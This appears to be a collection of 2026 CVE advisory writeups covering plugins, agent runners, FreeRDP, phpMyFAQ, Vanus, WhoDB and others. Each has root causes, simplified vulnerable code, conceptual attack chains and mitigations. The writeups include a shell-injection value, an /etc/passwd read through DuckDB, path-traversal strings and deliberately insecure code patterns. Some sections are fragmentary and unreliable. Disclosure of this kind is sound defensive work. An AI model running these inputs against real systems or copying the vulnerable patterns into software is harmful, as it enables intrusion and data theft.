docs.title: CVE-2026-110886 — Conversational Forms for ChatBot: PHP Object Injection
docs.text: Field Value Severity Critical — CVSS 9.8 Product Conversational Forms for ChatBot WordPress plugin Type Deserialization of Untrusted Data (CWE-502) Vector Unauthenticated, network → remote code execution via gadget chain

docs.title: Affected versions
docs.text: Conversational Forms for ChatBot through 1.5.1. Fixed in versions past 1.5.1.

docs.title: Root cause
docs.text:
The plugin takes attacker-controlled input and passes it straight to PHP's unserialize(), which rebuilds live objects — and runs their magic methods — from raw bytes off the network. unserialize() does not just parse data: it instantiates classes and runs their constructors, destructors, and __wakeup hooks. Without a signature or integrity check on the input, the attacker chooses which objects come alive.

// Simplified vulnerable pattern
$data = unserialize($_POST['chat_state']);  // attacker-controlled bytes
// fixed: $data = json_decode($_POST['chat_state'], true);
//        plus HMAC verification of the payload

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. The attacker crafts a serialized payload chaining gadget classes already present in WordPress — a POP chain — and submits it as chat state.
  2. The plugin unserializes it; the chain fires: file writes, database writes.
  3. With the right gadgets, the chain reaches arbitrary PHP execution on the server.

The accompanying poc.py demonstrates the pattern safely: a mock chat state handler whose vulnerable variant instantiates attacker-named classes, versus the fixed variant that only accepts JSON-decoded plain data with a verified signature. Fully offline, synthetic data — no exploit, no network calls.

Object injection on a server that unserializes blind is as bad as remote code execution.

docs.title: Mitigation
docs.text:
• Update Conversational Forms past 1.5.1 immediately.
  • Scan uploads and plugin folders for unexpected files.
  • Review recent admin activity for actions you did not take.
  • Never unserialize data you did not sign yourself — use JSON plus an HMAC for round-tripped state.

docs.text: Field Value Severity High — CVSS 8.5 Product Support Genix WordPress support ticket plugin Type Improper Neutralization of Special Elements used in an SQL Command (CWE-89) Vector Unauthenticated, network → full users table dump

docs.title: Affected versions
docs.text: Support Genix through 1.4.54. Fixed in versions past 1.4.54.

# Simplified vulnerable pattern

#                   (ticket_filter,))

  2. The database obeys, and the plugin returns the rows as if they were tickets: logins, emails, password hashes, all of it.
  3. Cracked offline, those hashes become working logins, and working logins become admin sessions.

docs.title: CVE-2026-111322 — Archon Unauthenticated Control API
docs.text: Field Detail Severity Critical 9.8 (CVSS 3.1) Product Archon agent harness, 0.2.13 – 0.11.1 Type Missing authentication (CWE-306) → unauthenticated remote control of the AI coding agent Attack vector Network · /api/* binds to 0.0.0.0:3090 with no login

docs.title: Affected versions
docs.text: Archon 0.2.13 through 0.11.1. No patch available as of 2026-10-17.

docs.title: Root cause
docs.text:
The agent control API (/api/*) requires no authentication — no token, no password — and the server binds to 0.0.0.0:3090 by default, i.e. every network interface. Anyone with network reach can send messages to the AI coding agent, which runs with bypassed permissions, and even "approve" actions the agent paused to ask the real user about. The agent cannot tell the attacker's approval from yours.

// simplified: the vulnerable defaults
app.listen(3090, '0.0.0.0');   // reachable from the whole network
POST /api/messages -> agent    // no auth check anywhere

  • Firewall port 3090 from the LAN; never expose it to the internet.

docs.text: Field Detail Severity High 8.8 (CVSS 3.1) Product FreeRDP client, before 3.32.0 Type Heap out-of-bounds write (CWE-787) → memory corruption, possible RCE Attack vector Network · the server attacks the connecting client

  3. Client writes past the U/V planes → heap corruption → potential code execution on the victim's machine, inside their network.

docs.title: CVE-2026-111440 — openGauss JDBC: Unsafe Reflection Turns a Logger Setting into Arbitrary Class Loading
docs.text: Field Value Severity High — CVSS 7.0 Product openGauss-connector-jdbc — the official openGauss JDBC driver, versions 1.1.0 through 6.x / 7.0.0-RC3 Type Unsafe reflection (CWE-470): LogFactory builds a logger class straight from the JDBC URL with no type check before instantiation Vector Network-adjacent, low complexity, no privileges → whoever controls the logger connection parameter triggers arbitrary class instantiation on the client

docs.title: Affected versions
docs.text: • openGauss-connector-jdbc 1.1.0 through 6.x and 7.0.0-RC3. Fixed in 7.0.0-LTS.

docs.title: Root cause
docs.text:
LogFactory reads the logger class name directly from the JDBC URL's logger parameter, calls Class.forName on that attacker-controlled string, then reflects a String constructor and instantiates it — before ever checking that the class actually implements the Log interface. The cast to Log comes after construction, so any class on the client's classpath with a String constructor gets built, and its constructor side effects (file writes, network calls, deserialization chains) fire inside your application. The check comes after the damage.

// Simplified vulnerable pattern
Class<?> c = Class.forName(loggerName);          // attacker-controlled string
Constructor<?> k = c.getConstructor(String.class);
Log log = (Log) k.newInstance(arg);              // side effects already fired

// Simplified fixed pattern: validate BEFORE constructing
Class<? extends Log> c = Class.forName(name).asSubclass(Log.class);
Log log = c.getConstructor(String.class).newInstance(arg);

docs.text:

  2. The attacker names a gadget class already present in the client's classpath.
  3. LogFactory loads it via Class.forName and invokes its String constructor — the gadget's side effects execute.
  4. Only then does the cast to Log fail — too late.

The accompanying poc.py demonstrates the pattern safely: a factory that builds a class before validating it versus one that validates with an interface check first. Fully offline, synthetic data — no exploit, no network calls.

docs.title: CVE-2026-111823 — Mage AI: OAuth Error Path Creates an Authenticated Session
docs.text: Field Value Severity Critical — CVSS 9.8 Product mage-ai data pipeline orchestration Type Detection of Error Condition Without Action (CWE-390) Vector Unauthenticated, network → full authenticated session

docs.title: Affected versions
docs.text: Mage OSS versions through 0.9.80. Fixed in the commit after 0.9.80 (upstream PR mage-ai/mage-ai#6204, change 76c4f46).

docs.title: Root cause
docs.text:
In the OAuth callback handler, when the login flow encounters an unknown OAuth provider, the code detects the error condition — and then keeps going. Session creation is not aborted, so an unauthenticated request that merely triggers the error path ends up with a valid, authenticated session.

# Simplified vulnerable pattern
if provider not in KNOWN_PROVIDERS:
    log("unknown oauth provider")   # error detected...
create_session(user)                 # ...but the flow continues anyway

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. The attacker starts the Mage OAuth login flow and steers the callback into the "unknown provider" error path.
  2. The error is logged, but the handler proceeds to session creation.
  3. The attacker holds a valid authenticated session — no credentials, no real identity provider involved.

The accompanying poc.py demonstrates the pattern safely: a mock OAuth callback that detects an unknown provider and (in the vulnerable variant) still mints a session, versus the fixed variant that aborts. Fully offline, synthetic data — no exploit, no network calls.

A public proof of concept for the real vulnerability has been observed in the wild; treat any internet-facing Mage instance as potentially probed.

docs.title: Mitigation
docs.text:
• Update Mage AI past 0.9.80 to the fixed commit immediately.
  • Rotate every credential stored in Mage (S3 keys, Snowflake, Salesforce tokens, etc.) — assume they were readable.
  • Audit active sessions for logins that bypassed OAuth providers.
  • Restrict Mage's network exposure; it should not be reachable from the open internet without additional access controls.

docs.text:
Field Value Severity High — CVSS 8.8 Product Tektronix 3 Series MDO oscilloscopes Type OS Command Injection (CWE-78); Path Traversal (CWE-22) Vector Network attacker → arbitrary OS command execution on the instrument

This writeup covers three CVEs published together for the same product:

CVE Issue CVE-2026-111853 High 8.8 — OS command injection in the FILESystem:MOUNT:DRIve SCPI command handler CVE-2026-111854 High 8.1 — path traversal in the SCPI FILESystem command interface (read/modify arbitrary files) CVE-2026-111855 High 7.5 — path traversal in the web management interface (read arbitrary files, unauthenticated)

docs.title: Affected versions
docs.text: Firmware before 1.21.1. Fixed in 1.21.1 (vendor advisory TEK-PSA-002-092026).

docs.title: Root cause
docs.text:
The SCPI FILESystem:MOUNT:DRIve handler concatenates user-supplied input into an operating-system command without neutralization. A "filename" can therefore smuggle shell metacharacters, and the instrument's OS executes them. The sibling flaws skip path validation, so ../ sequences escape the intended directory on both the SCPI interface and the web UI.

/* Simplified vulnerable pattern */
char cmd[256];
sprintf(cmd, "mount %s", user_input);  /* user_input = '"; id #' */
system(cmd);                           /* attacker's command runs */

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain for CVE-2026-111853 is:

  1. The attacker reaches the instrument over the network (SCPI remote control is a normal lab feature).
  2. They send a crafted FILESystem:MOUNT:DRIve command whose "drive" argument contains shell metacharacters.
  3. The handler builds an OS command from the raw input — the attacker's commands execute with the device's privileges.

The accompanying poc.py demonstrates the pattern safely: a mock SCPI handler that interpolates raw input into a shell string versus a fixed one that validates the path and never shells out. Fully offline, synthetic data — no exploit, no network calls.

  • Segment lab instruments onto an isolated network; do not expose SCPI or the web UI to untrusted networks.
  • Disable remote SCPI if the lab does not use it.

docs.title: CVE-2026-111880 — FreeRDP: Rogue Server Attacks the Client (Heap OOB + Int Underflow)
docs.text:
Field Value Severity High — CVSS 7.6 Product FreeRDP open-source RDP client library Type Heap-based Buffer Overflow (CWE-787); Integer Underflow (CWE-191) Vector Malicious RDP server → memory corruption on the connecting client

This writeup covers two CVEs published together:

CVE Issue CVE-2026-111880 High 7.4 — heap out-of-bounds write in the server hash-callback NTLM path: a crafted AUTHENTICATE_MESSAGE with a backward session-key offset defeats MIC validation CVE-2026-111881 High 7.6 — integer underflow in the WinPR BMP writer: a mismatched stride passes SIZE_MAX - 3 to Stream_Zero for sub-byte images, reachable via a malicious RDP clipboard peer returning a crafted 1-bpp BMP

docs.title: Affected versions
docs.text:
• CVE-2026-111880: FreeRDP 2.0.0 through 3.31.x. Fixed in 3.32.0.
  • CVE-2026-111881: FreeRDP 3.14.1 through 3.31.x. Fixed in 3.32.0.

docs.title: Root cause
docs.text:
Both flaws are unchecked arithmetic on attacker-influenced values. In the NTLM path, the MIC offset from the server is used to compute a write destination without verifying it stays inside the heap buffer — a backward offset writes before the buffer. In the BMP writer, the stride calculation for sub-byte images underflows, producing a gigantic length for a zero-fill operation.

/* Simplified vulnerable pattern */
// MIC offset from the server is never range-checked:
memcpy(buf + offset, key, len);   // offset can point backwards -> heap OOB

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. The victim (or their automated tooling) connects to a malicious RDP server.
  2. During NTLM authentication the server sends a crafted AUTHENTICATE_MESSAGE with a backward session-key offset; the client's hash-callback writes out of bounds. Alternatively the server returns a poisoned 1-bpp clipboard BMP that underflows the stride math.
  3. Client memory is corrupted — the classic precursor to code execution, with the roles reversed: the server exploits the client.

The accompanying poc.py demonstrates the pattern safely: a mock message parser that applies an unchecked offset versus a fixed one that range-checks before writing. Fully offline, synthetic data — no exploit, no network calls.

docs.title: Mitigation
docs.text:
• Update FreeRDP to 3.32.0 immediately.
  • Do not connect to untrusted RDP servers.
  • Disable clipboard redirection where it is not needed.
  • Audit in-house tools and thin clients that bundle FreeRDP.

docs.title: CVE-2026-111911 — phpMyFAQ: Eight Auth Flaws, Including WebAuthn Login Bypass
docs.text:
Field Value Severity Critical — CVSS 9.8 Product phpmyfaq open-source FAQ software Type Improper Authentication (CWE-287) and related Vector Unauthenticated, network → account takeover (passkey registration without auth)

This writeup covers the batch of eight CVEs published together for phpMyFAQ, led by CVE-2026-111911:

CVE Issue CVE-2026-111911 Critical 9.8 — WebAuthn registration endpoints attach credentials to any account without authentication or challenge validation CVE-2026-111882 High 8.1 — SSO callbacks let IdP-authenticated users skip TOTP 2FA (Keycloak / Entra ID) CVE-2026-111884 High 8.3 — e-mail change does not require the current password → account takeover CVE-2026-111898 High 7.5 — Keycloak implicit account linking lets attackers take over local accounts CVE-2026-111908 High 8.3 — BOLA in PUT /api/v3.1/faq/update: no per-FAQ authorization check CVE-2026-111909 High 8.1 — deleteUser() API lets non-superadmins delete superadmin accounts CVE-2026-111907 High 7.1 — CSRF on POST /admin/api/update-database runs DB migrations CVE-2026-111901 High 7.5 — unauthenticated DoS via unbounded faqs/search API pagination

docs.title: Affected versions
docs.text: phpMyFAQ 4.0.0 through 4.1.8 (several also cover 3.2.0-alpha+ and the 4.2.0-alpha line). Fixed in 4.1.9 / 4.2.0-beta.

docs.title: Root cause
docs.text:
The headline flaw (CVE-2026-111911): the WebAuthn registration endpoints never require the caller to be authenticated and never validate the ceremony challenge. They accept a caller-supplied username, attach the submitted credential to that account, and that's it — a forged fmt=none attestation registers a working passkey for someone else's account. Login then proceeds with the attacker's passkey, bypassing password and TOTP.

The siblings share the same DNA: authentication steps that exist on paper but are skipped in code — password-change without the current password, attachment management without ownership checks, account linking on colliding usernames.

// Simplified vulnerable pattern
function registerWebAuthn($username, $attestation) {
    // no session check, no challenge check
    $account = findUser($username);          // any account
    $account->addCredential($attestation);   // forged fmt=none accepted
}

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain for CVE-2026-111911 is:

  1. The attacker picks a victim username (e.g. the admin account).
  2. They submit a forged WebAuthn attestation to the registration endpoint — no login, no valid challenge.
  3. The server attaches the attacker's passkey to the victim account.
  4. The attacker logs in with the passkey: password skipped, TOTP skipped — full account takeover.

The accompanying poc.py demonstrates the pattern safely: a mock credential-registration function that accepts an unattested binding versus a fixed one that requires an authenticated session and a valid challenge. Fully offline, synthetic data — no exploit, no network calls.

docs.title: Mitigation
docs.text:
• Update phpMyFAQ to 4.1.9 (or 4.2.0-beta) immediately — it fixes all eight.
  • Force password resets for all users, especially administrators.
  • Audit admin accounts and review webauthn credential registrations for keys nobody recognizes — treat unknown credentials as hostile.
  • Check logs for forged attestation submissions and unusual SSO callbacks.

docs.title: CVE-2026-111923 — Fleet: 150 Bytes Crash the MDM Server (Unauthenticated DoS)
docs.text:
Field Value Severity High — CVSS 7.5 Product fleet open-source device management (MDM) Type Uncontrolled Recursion (CWE-674); Uncontrolled Resource Consumption (CWE-409) Vector Unauthenticated, network → denial of service

This writeup covers two CVEs published together:

CVE Issue CVE-2026-111923 High 7.5 — unbounded recursion in Apple MDM enrollment plist parsing: a crafted ~150-byte binary plist crashes the server CVE-2026-111924 High 7.5 — denial of service via unbounded gzip decompression: small, highly compressed request bodies exhaust server memory

docs.title: Affected versions
docs.text:
• CVE-2026-111923: Fleet before 4.89.0. Fixed in 4.89.0.
  • CVE-2026-111924: Fleet before 4.83.0. Fixed in 4.83.0.

docs.title: Root cause
docs.text:
The MDM enrollment endpoint parses a binary property list recursively with no depth limit — a deeply nested 150-byte payload makes the parser recurse until the process stack is exhausted. Separately, request bodies with Content-Encoding: gzip are decompressed without a size cap, so a tiny upload expands into gigabytes of resident memory.

// Simplified vulnerable pattern
func parsePlist(node *Node) {
    for _, child := range node.Children {
        parsePlist(child)   // no depth limit -> stack exhaustion
    }
}

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. The attacker — no login, no credentials — POSTs a ~150-byte crafted binary plist to the unauthenticated Apple MDM enrollment endpoint.
  2. The parser recurses without bound and the server process crashes. (Alternatively: a small gzip bomb balloons in memory until the host is exhausted.)
  3. The Fleet server is down: no policies, no device visibility, no remote wipe — the whole managed fleet goes unmanaged.

The accompanying poc.py demonstrates the pattern safely: a mock plist parser that recurses without limits versus a fixed one with a depth cap, plus a bounded-decompression helper. Fully offline, synthetic data — no exploit, no network calls.

docs.title: Mitigation
docs.text:
• Update Fleet to 4.89.0 or later (covers both flaws).
  • Rate-limit the enrollment endpoint and put it behind a WAF/reverse proxy with request-size limits.
  • Monitor the Fleet process for crashes and restart loops.
  • Keep MDM highly available — it is the control plane you need most during an incident.

docs.text: Field Value Severity High — CVSS 7.7 Product coder cloud development environments Type Improper Hostname Validation (CWE-522 credential exposure pattern) Vector Network attacker registers lookalike domain → credential theft from developers

docs.title: Root cause
docs.text:

Any domain that merely starts with a legitimate workspace hostname passes validation — so ws-42.attacker.com is accepted as if it were the real ws-42 proxy. -- Simplified vulnerable pattern
SELECT * FROM workspace_proxies
WHERE host SIMILAR TO 'ws-42.%';   -- prefix match: ws-42.attacker.com passes

  1. The attacker registers a domain that is a string prefix of a real workspace proxy hostname (not a real subdomain — just "starts with").
  2. Coder's validation waves it through as a legitimate proxy.
  3. Developers are routed (or phished) to the twin; their session tokens, API keys, and cloud credentials are harvested.

The accompanying poc.py demonstrates the pattern safely: a mock hostname validator using a prefix match versus a fixed one requiring an exact, anchored match. Fully offline, synthetic data — no exploit, no network calls.

  • Watch DNS/certificate transparency for lookalike domains impersonating your workspace hostnames.

docs.title: CVE-2026-111998 — Vanus: Hardcoded Admin Token and Open Receivers
docs.text: Field Value Severity Critical — CVSS 9.8 Product Vanus serverless event streaming, versions 0.8.0–0.9.0 Type Use of Hard-coded Credentials (CWE-798); sibling flaws allow unauthenticated event publishing and tenant subscription hijacking Vector Network (gateway port reachable) → cluster admin

docs.title: Affected versions
docs.text: Vanus 0.8.0 through 0.9.0. No patch is available yet — the issues are still open upstream.

docs.title: Root cause
docs.text:
A hardcoded admin token ships in the source code itself: the same fixed Bearer token in every install, publicly visible. A credential that never changes is just a password everyone shares. The gateway checks that a token is present — not that it belongs to someone — and on some endpoints it checks nothing at all. Three flaws, one pattern: authentication built as decoration instead of a wall.

// Simplified vulnerable pattern
const adminToken = "<same-value-in-every-install>" // shipped in source
if r.Header.Get("Authorization") == "Bearer "+adminToken {
    grantClusterAdmin()  // never asks WHO the caller is
}
// fixed: random per-install secret, verified identity per request

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. The attacker reads the token from the public source — no guessing, no brute force.
  2. They connect to the gateway gRPC proxy port and send the hardcoded Bearer token. Vanus accepts it without question.
  3. As cluster admin they can create and delete namespaces, publish or read any event, manage users, tokens, and role bindings. A second flaw lets unauthenticated attackers publish events straight through the CloudEvents HTTP receiver, and a third lets any authenticated user hijack other tenants' subscriptions.

The accompanying poc.py demonstrates the pattern safely: a mock gateway whose vulnerable auth accepts the well-known token from anyone, versus the fixed auth that requires a per-install secret and verifies identity. Fully offline, synthetic data — no real token, no network calls.

docs.title: Mitigation
docs.text:
• Block all network access to the Vanus gateway ports right now — never expose them to the internet.
  • Audit every eventbus for forged CloudEvents.
  • Watch the upstream project for a release, and rotate every token the moment you upgrade.
  • Treat the deployment as compromised until proven otherwise.

docs.title: CVE-2026-111999 — Vanus: Missing Authentication Lets Anyone Publish to Any Eventbus
docs.text:
Field Value Severity High — CVSS 7.5 Product vanus-labs/vanus — event-driven serverless platform, versions 0.8.0 through 0.9.0 Type Missing authentication for critical function (CWE-306): the gateway CloudEvents HTTP receiver skips token authentication and authPublish checks Vector Network, no privileges, no user interaction → unauthenticated remote attackers publish forged events to any eventbus

This writeup covers two gateway auth CVEs published together against Vanus:

CVE Issue CVE-2026-111999 Missing authentication (CWE-306): the gateway CloudEvents HTTP receiver lets unauthenticated remote attackers publish events to any eventbus, bypassing token auth and authPublish checks. CVSS 7.5. CVE-2026-112000 Missing authorization (CWE-862): any authenticated user can call Subscribe, Ack and unregistered gateway methods without permission checks — hijack another tenant's subscription, read and acknowledge its events, starve the legitimate consumer, enumerate cluster users via ListUser. CVSS 7.6.

(Companion to CVE-2026-111998, the 9.8 default-admin-credentials hole in the same gateway — Vanus shipped three auth failures in one day.)

docs.title: Affected versions
docs.text: • Vanus 0.8.0 through 0.9.0. Track the fix via vanus-labs/vanus#647 and upgrade past 0.9.0 once a patched release lands.

docs.title: Root cause
docs.text:
The gateway's CloudEvents HTTP receiver (/namespaces/{ns}/eventbus/{name}/events and the legacy /gateway/{name} paths) goes straight from parsing the request to storing the event — the token authentication and authPublish checks exist in the codebase but never run on these paths. Likewise, the gRPC proxy path accepts Subscribe/Ack calls from any authenticated identity without checking ownership of the subscription. Security code that never executes is the same as no security at all.

# Simplified vulnerable pattern
def handle_publish(req):
    # no checkToken(req), no checkPublish(user, eventbus)
    store_event(req.eventbus, req.event)      # stranger's event lands here
    forward_to_subscribers(req.eventbus)

# Simplified fixed pattern
def handle_publish(req):
    if not check_token(req): return reject()
    if not check_publish(req.user, req.eventbus): return reject()
    store_event(req.eventbus, req.event)

docs.title: Proof of concept (conceptual)
docs.text:
1. The target runs Vanus 0.8.0–0.9.0 with its gateway reachable on the network.
  2. The attacker crafts a CloudEvent and POSTs it to the gateway's event path for the victim's eventbus — no token, no login.
  3. The gateway stores the forged event and delivers it to the bus's real subscription sinks (billing, alerts, automation).
  4. With any low-privilege account (CVE-2026-112000), the attacker calls Subscribe with another tenant's subscription ID, reads its events, and Acks them so the legitimate consumer never sees them.

The accompanying poc.py demonstrates the pattern safely: a receiver with the auth checks commented out versus one that validates token + publish permission before storing. Fully offline, synthetic data — no exploit, no network calls.

docs.text:

  • Keep the gateway off the public internet — firewall the HTTP/gRPC gateway ports to trusted networks only.
  • Rotate all tokens and secrets; assume any token-bearing path was reachable.
  • Audit subscriptions for unknown consumers and watch for events you never sent.

docs.title: CVE-2026-112000 — Vanus: Missing Authorization Lets Any User Hijack Subscriptions
docs.text:
Field Value Severity High — CVSS 7.6 Product vanus-labs/vanus — event-driven serverless platform, versions 0.8.0 through 0.9.0 Type Missing authorization (CWE-862): gateway streaming RPCs (Subscribe, Ack, unregistered methods) skip permission checks Vector Network, low privileges, no user interaction → any authenticated user hijacks other tenants' subscriptions

Companion to CVE-2026-111999 (missing authentication — unauthenticated event publishing), covered in the same explainer video.

docs.title: Affected versions
docs.text: • Vanus 0.8.0 through 0.9.0. Track the fix via vanus-labs/vanus#647 and upgrade past 0.9.0 once a patched release lands.

docs.title: Root cause
docs.text:
The gateway proxy accepts Subscribe, Ack and other streaming RPC calls from any authenticated identity and never verifies that the caller owns the subscription it names. An attacker passes another tenant's subscription ID to Subscribe and the gateway hands over that tenant's event stream; Acks from the attacker then advance the offset, so the legitimate consumer starves. ListUser is similarly unguarded, enabling user enumeration.

# Simplified vulnerable pattern
def subscribe(user, subscription_id):
    return attach(user, subscription_id)   # ownership never checked

# Simplified fixed pattern
def subscribe(user, subscription_id):
    if owner_of(subscription_id) != user:
        return reject("not your subscription")
    return attach(user, subscription_id)

docs.title: Proof of concept (conceptual)
docs.text:
1. The attacker holds any low-privilege Vanus account.
  2. They call Subscribe with a victim tenant's subscription ID — no permission check runs.
  3. They read the victim's events and Ack them, advancing the offset past the legitimate consumer.
  4. They call ListUser to enumerate cluster users for follow-up attacks.

The accompanying poc.py (shared with the CVE-2026-111999 writeup) demonstrates the pattern safely: an ownership-blind Subscribe versus one that verifies the caller owns the subscription. Fully offline, synthetic data — no exploit, no network calls.

docs.title: Mitigation
docs.text:
• Update Vanus past 0.9.0 as soon as the upstream fix lands (follow issue #647).
  • Enforce tenant isolation at the gateway: every RPC must check caller-vs-resource ownership.
  • Audit subscription offsets for unexplained Ack jumps and unknown attached consumers.
  • Rotate credentials and restrict gateway network exposure in the meantime.

docs.title: CVE-2026-112001 — ProjectSend: Scoped API Token Can Reset Its Owner's Password
docs.text: Field Value Severity High — CVSS 7.2 Product ProjectSend self-hosted file sharing Type Authorization Bypass Through User-Controlled Key (CWE-639) Vector Low-privilege token holder, network → full account takeover of the token owner

docs.title: Affected versions
docs.text: ProjectSend before 2.7.0. Fixed in 2.7.0.

docs.title: Root cause
docs.text:
In the users API, a token holder with manage_users and edit_users scopes can call PATCH /api/v1/users/{user} — and change the credentials of the token's own owner. The scopes guard which action is allowed, but nobody checks whose account is being changed. The ability check asks "can this token manage users" but never asks "is this token allowed to touch THIS user". Authorization was written for the action, not the target.

// Simplified vulnerable pattern
// PATCH /api/v1/users/{user}
if ($token->can('manage_users') && $token->can('edit_users')) {
    update_user($user_id, $new_password, $twofa = null); // whose account?
}
// fixed: deny when $user_id === $token->owner_id unless a separate
// 'manage_own_account_recovery' scope is present

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. The attacker already holds a low-privilege scoped token (limited API access, nothing dramatic).
  2. They send PATCH /api/v1/users/{user} naming the token's owner, set a brand-new password, and clear two-factor authentication in the same call.
  3. They open the login page and sign in — with the owner's full role and permissions. Passwords, two-factor settings, and role boundaries are all gone.

The accompanying poc.py demonstrates the pattern safely: a mock users API whose vulnerable PATCH honors any target the scopes allow, versus the fixed one that refuses self-targeting. Fully offline, synthetic data — no exploit, no network calls.

One limited token becomes the keys to the whole installation.

docs.title: Mitigation
docs.text:
• Update to ProjectSend 2.7.0 immediately.
  • Force a password reset for every staff account and re-enforce two-factor authentication.
  • Revoke and reissue all API tokens.
  • Audit the user change log for password or 2FA changes you did not make.

docs.title: CVE-2026-112005 — WhoDB: DuckDB Query Editor Allows Arbitrary File Access
docs.text: Field Value Severity High — CVSS 7.7 Product WhoDB database dashboard Type Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-22) Vector Network (dashboard reachable) → arbitrary file read/write on the host

docs.title: Affected versions
docs.text: WhoDB before 0.135.0. Fixed in 0.135.0.

docs.title: Root cause
docs.text:
The query editor passes user SQL straight to DuckDB — including its filesystem functions. DuckDB is an analytics engine with a full filesystem toolkit (read_text, read_blob, COPY ... TO, ATTACH), and WhoDB hands it raw user SQL with no path allow-list. A query language meant for tables was given the keys to the filesystem, and the editor never asked where the path points.

# Simplified vulnerable pattern
result = duckdb.sql(user_query)   # read_text('/etc/passwd') sails through
# fixed: reject filesystem functions, confine DuckDB file access to an
# allow-listed directory, keep the dashboard off the public internet

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. The attacker logs in to a DuckDB file — no credentials needed — and types filesystem calls into the query editor.
  2. First they steal session.key, the secret that signs sessions. Then the stored database credentials.
  3. With COPY ... TO, they overwrite files on the host. Every step is just SQL.

The accompanying poc.py demonstrates the pattern safely: a mock query gate whose vulnerable variant passes everything to the "engine", versus the fixed gate that rejects filesystem functions and out-of-scope paths. Fully offline, synthetic data — no exploit, no real DuckDB, no network calls.

The database dashboard becomes an unauthenticated file server for whoever knows the DuckDB tricks: session keys and stored credentials exfiltrated, config files rewritten, a foothold for deeper compromise.

docs.title: Mitigation
docs.text:
• Update to WhoDB 0.135.0 immediately.
  • Rotate session.key right away, and change every database credential stored in WhoDB — assume they were stolen.
  • Keep WhoDB off the public internet and restrict who can reach the dashboard.
  • Treat embedded query engines as filesystem access until proven sandboxed.

docs.title: CVE-2026-112015 — Omnigent: Sub-Agent Working Directory Escapes the Sandbox
docs.text: Field Value Severity High — CVSS 7.5 Product Omnigent AI agent runner Type Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-22) Vector Malicious bundle upload → arbitrary file read/write on the host as the runner user

docs.title: Affected versions
docs.text: Omnigent before 0.14.0. Fixed in 0.14.0.

docs.title: Root cause
docs.text:
Workspace paths are supposed to stay inside the root — but when a nested sub-agent sets os_env.cwd, the root-only validation in bundles.py is bypassed. An absolute path or a parent-traversing one like ../../.. sails right through, and the agent runs outside its sandbox. The workspace boundary was enforced by string checks on the top-level config, but nested sub-agents write their own working directory, and nobody canonicalized the final path before comparing it to the root.

# Simplified vulnerable pattern
cwd = sub_agent.get("os_env", {}).get("cwd", root)
workdir = os.path.join(root, cwd)      # "../../.." escapes silently
# fixed:
resolved = os.path.realpath(os.path.join(root, cwd))
if not resolved.startswith(os.path.realpath(root) + os.sep):
    raise ValueError("working directory escapes the workspace")

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. The attacker uploads a bundle whose sub-agent sets os_env.cwd to an absolute path or a traversal sequence.
  2. Omnigent accepts it. The agent now reads and writes host files as the runner user — configs, secrets, SSH keys — while everyone still believes it is locked in its little workspace.
  3. One ../ at a time, the agent walks out the front door.

The accompanying poc.py demonstrates the pattern safely: a mock workspace resolver whose vulnerable variant joins paths blindly, versus the fixed one that canonicalizes and enforces containment. Fully offline, synthetic data — no exploit, no filesystem access, no network calls.

The platform that runs untrusted code by design hands attackers the very filesystem it promised to protect.

docs.title: Mitigation
docs.text:
• Update to Omnigent 0.14.0 immediately.
  • Audit every bundle you have ever run for suspicious os_env.cwd values.
  • Run agents as a least-privilege user from now on.
  • Treat uploaded bundles like untrusted code — because they are.

docs.title: CVE-2026-112018 — cgltf: Heap Out-of-Bounds Write via Sparse Accessor Indices
docs.text: Field Value Severity High — CVSS 7.0 Product cgltf glTF 3D model parser Type Out-of-bounds Write (CWE-787) Vector Malicious 3D model file → memory corruption (denial of service, possible code execution)

docs.title: Affected versions
docs.text: cgltf through 1.15. No patch is available yet — defend at the call site and watch the repository for a fixed release.

docs.title: Root cause
docs.text:
Heap out-of-bounds write in cgltf_accessor_unpack_floats(): sparse accessors carry their own indices, and the function never validates them before writing. The parser treats attacker-controlled numbers as trusted offsets — indices from the file are used as write positions before anyone checks they fit the buffer. Validation exists (cgltf_validate()), but unpacking without calling it first is the loaded gun.

/* Simplified vulnerable pattern */
for (i = 0; i < sparse_count; ++i) {
    out[indices[i]] = values[i];   /* indices never validated */
}
/* fixed: */
for (i = 0; i < sparse_count; ++i) {
    if (indices[i] >= count) return ERROR;  /* bounds-check first */
    out[indices[i]] = values[i];
}

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. The attacker crafts a GLB with huge sparse indices and gets the target app to open it — an uploaded avatar, a shared asset, a preview thumbnail.
  2. cgltf_accessor_unpack_floats() writes where the indices say, past the output buffer into heap memory.
  3. Crash at best, code execution at worst — especially when the app skips cgltf_validate().

The accompanying poc.py demonstrates the pattern safely in Python: a mock unpack routine whose vulnerable variant applies indices unchecked (flagging the out-of-bounds write), versus the fixed variant that bounds-checks every index. Fully offline, synthetic data — no exploit, no real memory corruption, no network calls.

docs.title: Mitigation
docs.text:
• Always call cgltf_validate() before unpacking accessors; reject any model that fails validation.
  • Parse untrusted models in a sandboxed worker process.
  • Pin the dependency and watch the repository for a fixed release.
  • Treat 3D model files as untrusted input, like images and fonts.

docs.title: CVE-2026-112021 — snac2: Heap Buffer Overflow in JSON Lexer Crashes the Server
docs.text: Field Value Severity High — CVSS 7.5 Product snac2 fediverse (ActivityPub) server Type Heap-based Buffer Overflow (CWE-122) Vector Unauthenticated, single POST → remote denial of service

docs.title: Affected versions
docs.text: snac2 before 2.93. Fixed in 2.93.

docs.title: Root cause
docs.text:
Heap-based buffer overflow in _xs_json_load_lexer(): when the JSON contains a \u0000 escape, the lexer mishandles the embedded null and overflows heap allocations while copying the string. Worse, it happens on unauthenticated input — the handler parses the body before verifying the signature, so a malformed message reaches the fragile lexer with zero authentication. Parse-before-auth plus a lexer that trusts escape sequences means every anonymous sender gets a shot at the heap.

/* Simplified vulnerable pattern */
parse(body);            /* \u0000 escape mishandled in the lexer */
verify_signature(body); /* ...only afterwards */
/* fixed: verify the signature FIRST, then parse;
